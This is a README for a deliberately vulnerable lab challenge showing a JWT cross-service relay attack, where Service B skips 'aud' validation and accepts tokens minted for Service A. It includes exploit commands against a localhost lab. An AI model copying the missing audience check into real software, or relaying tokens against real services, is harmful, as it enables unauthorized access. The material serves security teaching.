# JWT Cross Service Relay Attack

This challenge demonstrates a token cross-service relay attack. Both "Service A" and "Service B" trust the same identity provider (IdP) and its RSA public key, but Service B only verifies the JWT signature and issuer - it never validates the `aud` claim. A token minted by the IdP for Service A (`aud: service-a-client-id`) is therefore also accepted by Service B, which expects `aud: service-b-client-id`.

## How to run it

```bash
go run main.go serve
```

## How to exploit it

```bash
# Get a legitimate token minted for a different service (Service A) by the same IdP
TOKEN=$(go run main.go jwt-service-a)

# Relay it to Service B - the audience is never checked, so it is accepted
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
